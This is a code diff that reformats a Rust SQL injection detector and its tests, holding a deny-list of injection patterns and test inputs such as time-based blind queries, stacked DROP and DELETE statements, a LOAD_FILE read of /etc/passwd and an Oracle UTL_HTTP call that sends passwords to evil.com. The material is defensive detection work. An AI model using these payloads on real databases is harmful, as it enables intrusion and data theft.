@@ -420,7 +420,7 @@ fn contains_variables(sql: &str) -> bool {
 /// 6. **信息泄露**: INFORMATION_SCHEMA, SYSOBJECTS, SYSCOLUMNS
 /// 7. **编码绕过**: CHAR(), CONCAT(), 0X (十六进制)
 /// 8. **注释注入**: --, /* */
-fn contains_sql_injection(sql: &str) -> bool {
+pub fn contains_sql_injection(sql: &str) -> bool {
     let sql_without_strings = remove_string_literals(sql);
     let sql_upper = sql_without_strings.to_uppercase();
 
@@ -430,7 +430,6 @@ fn contains_sql_injection(sql: &str) -> bool {
         "UNION SELECT",
         "UNION ALL SELECT",
         "UNION DISTINCT SELECT",
-
         // === 布尔盲注 ===
         " OR 1=1",
         " OR 1 =1",
@@ -441,24 +440,19 @@ fn contains_sql_injection(sql: &str) -> bool {
         " AND 1=1",
         " AND TRUE",
         " AND FALSE",
-
         // === 时间盲注 - MySQL ===
         "SLEEP(",
         "BENCHMARK(",
-
         // === 时间盲注 - PostgreSQL ===
         "PG_SLEEP(",
         "PG_SLEEP_FOR(",
         "PG_SLEEP_UNTIL(",
-
         // === 时间盲注 - SQL Server ===
         "WAITFOR DELAY",
         "WAITFOR TIME",
-
         // === 时间盲注 - Oracle ===
         "DBMS_PIPE.RECEIVE_MESSAGE(",
         "DBMS_LOCK.SLEEP(",
-
         // === 动态 SQL 执行 ===
         "EXEC(",
         "EXECUTE(",
@@ -467,12 +461,10 @@ fn contains_sql_injection(sql: &str) -> bool {
         " xp_",
         "EXEC xp_",
         "EXECUTE xp_",
-
         // === 文件操作 ===
         "LOAD_FILE(",
         "INTO OUTFILE",
         "INTO DUMPFILE",
-
         // === 信息泄露 ===
         "INFORMATION_SCHEMA",
         "SYSOBJECTS",
@@ -488,14 +480,12 @@ fn contains_sql_injection(sql: &str) -> bool {
         "ALL_TAB_COLUMNS",
         "USER_TABLES",
         "USER_TAB_COLUMNS",
-
         // === 编码绕过 ===
         "CHAR(",
         "CHR(",
         "CONCAT(",
         "CONCAT_WS(",
         "0X",
-
         // === 堆叠查询 ===
         "; DROP",
         "; DELETE",
@@ -506,14 +496,12 @@ fn contains_sql_injection(sql: &str) -> bool {
         "; CREATE",
         "; EXEC",
         "; EXECUTE",
-
         // === 注释注入 ===
         "-- ",
         "--+",
         "#",
         "/* ",
         "*/",
-
         // === 其他危险模式 ===
         "HAVING 1=1",
         "ORDER BY 1--",
@@ -843,9 +831,13 @@ mod tests {
         // UNION SELECT
         assert!(contains_sql_injection("SELECT * FROM users UNION SELECT * FROM admin"));
         // UNION ALL SELECT
-        assert!(contains_sql_injection("SELECT * FROM users UNION ALL SELECT * FROM admin"));
+        assert!(contains_sql_injection(
+            "SELECT * FROM users UNION ALL SELECT * FROM admin"
+        ));
         // UNION DISTINCT SELECT
-        assert!(contains_sql_injection("SELECT * FROM users UNION DISTINCT SELECT password FROM admin"));
+        assert!(contains_sql_injection(
+            "SELECT * FROM users UNION DISTINCT SELECT password FROM admin"
+        ));
     }
 
     /// 测试布尔盲注检测
@@ -874,14 +866,18 @@ mod tests {
         assert!(contains_sql_injection("SELECT * FROM users WHERE id = 1 AND SLEEP(5)"));
         assert!(contains_sql_injection("SELECT SLEEP(10)"));
         // BENCHMARK
-        assert!(contains_sql_injection("SELECT * FROM users WHERE id = 1 AND BENCHMARK(10000000,SHA1('test'))"));
+        assert!(contains_sql_injection(
+            "SELECT * FROM users WHERE id = 1 AND BENCHMARK(10000000,SHA1('test'))"
+        ));
     }
 
     /// 测试 PostgreSQL 时间盲注检测
     #[test]
     fn test_sql_injection_time_blind_postgresql() {
         // PG_SLEEP
-        assert!(contains_sql_injection("SELECT * FROM users WHERE id = 1 AND PG_SLEEP(5)"));
+        assert!(contains_sql_injection(
+            "SELECT * FROM users WHERE id = 1 AND PG_SLEEP(5)"
+        ));
         assert!(contains_sql_injection("SELECT PG_SLEEP(10)"));
         // PG_SLEEP_FOR
         assert!(contains_sql_injection("SELECT PG_SLEEP_FOR('5 minutes')"));
@@ -903,7 +899,9 @@ mod tests {
     #[test]
     fn test_sql_injection_time_blind_oracle() {
         // DBMS_PIPE.RECEIVE_MESSAGE
-        assert!(contains_sql_injection("SELECT * FROM users WHERE id = 1 AND DBMS_PIPE.RECEIVE_MESSAGE('test', 5) = 1"));
+        assert!(contains_sql_injection(
+            "SELECT * FROM users WHERE id = 1 AND DBMS_PIPE.RECEIVE_MESSAGE('test', 5) = 1"
+        ));
         // DBMS_LOCK.SLEEP
         assert!(contains_sql_injection("SELECT DBMS_LOCK.SLEEP(5) FROM dual"));
     }
@@ -929,9 +927,13 @@ mod tests {
         // LOAD_FILE
         assert!(contains_sql_injection("SELECT LOAD_FILE('/etc/passwd')"));
         // INTO OUTFILE
-        assert!(contains_sql_injection("SELECT * FROM users INTO OUTFILE '/tmp/users.txt'"));
+        assert!(contains_sql_injection(
+            "SELECT * FROM users INTO OUTFILE '/tmp/users.txt'"
+        ));
         // INTO DUMPFILE
-        assert!(contains_sql_injection("SELECT * FROM users INTO DUMPFILE '/tmp/users.txt'"));
+        assert!(contains_sql_injection(
+            "SELECT * FROM users INTO DUMPFILE '/tmp/users.txt'"
+        ));
     }
 
     /// 测试信息泄露检测
@@ -963,11 +965,15 @@ mod tests {
     #[test]
     fn test_sql_injection_encoding_bypass() {
         // CHAR
-        assert!(contains_sql_injection("SELECT * FROM users WHERE name = CHAR(97,100,109,105,110)"));
+        assert!(contains_sql_injection(
+            "SELECT * FROM users WHERE name = CHAR(97,100,109,105,110)"
+        ));
         // CHR (Oracle/PostgreSQL)
         assert!(contains_sql_injection("SELECT * FROM users WHERE name = CHR(65)"));
         // CONCAT
-        assert!(contains_sql_injection("SELECT * FROM users WHERE name = CONCAT('ad','min')"));
+        assert!(contains_sql_injection(
+            "SELECT * FROM users WHERE name = CONCAT('ad','min')"
+        ));
         // CONCAT_WS
         assert!(contains_sql_injection("SELECT CONCAT_WS(',', 'a', 'b', 'c')"));
         // 十六进制
@@ -982,15 +988,23 @@ mod tests {
         // ; DELETE
         assert!(contains_sql_injection("SELECT * FROM users; DELETE FROM users"));
         // ; UPDATE
-        assert!(contains_sql_injection("SELECT * FROM users; UPDATE users SET admin = 1"));
+        assert!(contains_sql_injection(
+            "SELECT * FROM users; UPDATE users SET admin = 1"
+        ));
         // ; INSERT
-        assert!(contains_sql_injection("SELECT * FROM users; INSERT INTO users VALUES (1, 'hacker')"));
+        assert!(contains_sql_injection(
+            "SELECT * FROM users; INSERT INTO users VALUES (1, 'hacker')"
+        ));
         // ; TRUNCATE
         assert!(contains_sql_injection("SELECT * FROM users; TRUNCATE TABLE users"));
         // ; ALTER
-        assert!(contains_sql_injection("SELECT * FROM users; ALTER TABLE users ADD COLUMN hacked INT"));
+        assert!(contains_sql_injection(
+            "SELECT * FROM users; ALTER TABLE users ADD COLUMN hacked INT"
+        ));
         // ; CREATE
-        assert!(contains_sql_injection("SELECT * FROM users; CREATE TABLE hacked (id INT)"));
+        assert!(contains_sql_injection(
+            "SELECT * FROM users; CREATE TABLE hacked (id INT)"
+        ));
         // ; EXEC
         assert!(contains_sql_injection("SELECT * FROM users; EXEC('malicious')"));
         // ; EXECUTE
@@ -1021,16 +1035,28 @@ mod tests {
         // PROCEDURE ANALYSE (MySQL)
         assert!(contains_sql_injection("SELECT * FROM users PROCEDURE ANALYSE()"));
         // EXTRACTVALUE (MySQL XPath 注入)
-        assert!(contains_sql_injection("SELECT EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))"));
+        assert!(contains_sql_injection(
+            "SELECT EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))"
+        ));
         // UPDATEXML (MySQL XPath 注入)
-        assert!(contains_sql_injection("SELECT UPDATEXML(1, CONCAT(0x7e, (SELECT version())), 1)"));
+        assert!(contains_sql_injection(
+            "SELECT UPDATEXML(1, CONCAT(0x7e, (SELECT version())), 1)"
+        ));
         // XMLTYPE (Oracle)
-        assert!(contains_sql_injection("SELECT XMLTYPE('<x>' || (SELECT password FROM users) || '</x>') FROM dual"));
+        assert!(contains_sql_injection(
+            "SELECT XMLTYPE('<x>' || (SELECT password FROM users) || '</x>') FROM dual"
+        ));
         // UTL_HTTP (Oracle 网络请求)
-        assert!(contains_sql_injection("SELECT UTL_HTTP.REQUEST('http://evil.com/' || password) FROM users"));
+        assert!(contains_sql_injection(
+            "SELECT UTL_HTTP.REQUEST('http://evil.com/' || password) FROM users"
+        ));
         // UTL_INADDR (Oracle DNS 注入)
-        assert!(contains_sql_injection("SELECT UTL_INADDR.GET_HOST_ADDRESS('evil.com') FROM dual"));
-        assert!(contains_sql_injection("SELECT UTL_INADDR.GET_HOST_NAME('192.168.1.1') FROM dual"));
+        assert!(contains_sql_injection(
+            "SELECT UTL_INADDR.GET_HOST_ADDRESS('evil.com') FROM dual"
+        ));
+        assert!(contains_sql_injection(
+            "SELECT UTL_INADDR.GET_HOST_NAME('192.168.1.1') FROM dual"
+        ));
     }
 
     /// 测试正常 SQL 不被误报
@@ -1039,13 +1065,21 @@ mod tests {
         // 正常的 SELECT 语句不应被检测为注入
         assert!(!contains_sql_injection("SELECT id, name FROM users WHERE id = 1"));
         assert!(!contains_sql_injection("SELECT * FROM products WHERE price > 100"));
-        assert!(!contains_sql_injection("INSERT INTO users (name, email) VALUES ('test', 'test@example.com')"));
-        assert!(!contains_sql_injection("UPDATE users SET name = 'new_name' WHERE id = 1"));
+        assert!(!contains_sql_injection(
+            "INSERT INTO users (name, email) VALUES ('test', 'test@example.com')"
+        ));
+        assert!(!contains_sql_injection(
+            "UPDATE users SET name = 'new_name' WHERE id = 1"
+        ));
         assert!(!contains_sql_injection("DELETE FROM users WHERE id = 1"));
         // 正常的 JOIN 操作
-        assert!(!contains_sql_injection("SELECT u.name, o.order_id FROM users u JOIN orders o ON u.id = o.user_id"));
+        assert!(!contains_sql_injection(
+            "SELECT u.name, o.order_id FROM users u JOIN orders o ON u.id = o.user_id"
+        ));
         // 正常的子查询
-        assert!(!contains_sql_injection("SELECT * FROM users WHERE id IN (SELECT user_id FROM orders)"));
+        assert!(!contains_sql_injection(
+            "SELECT * FROM users WHERE id IN (SELECT user_id FROM orders)"
+        ));
     }
 
     /// 测试字符串字面量中的注入模式不会被误报
@@ -1053,7 +1087,11 @@ mod tests {
     fn test_sql_injection_in_string_literals() {
         // 字符串中的注入模式不应触发检测（因为字符串被移除）
         // 注意：这取决于 remove_string_literals 的实现
-        assert!(!contains_sql_injection("SELECT * FROM users WHERE name = 'test OR 1=1'"));
-        assert!(!contains_sql_injection("SELECT * FROM users WHERE comment = 'This is -- a comment'"));
+        assert!(!contains_sql_injection(
+            "SELECT * FROM users WHERE name = 'test OR 1=1'"
+        ));
+        assert!(!contains_sql_injection(
+            "SELECT * FROM users WHERE comment = 'This is -- a comment'"
+        ));
     }
 }
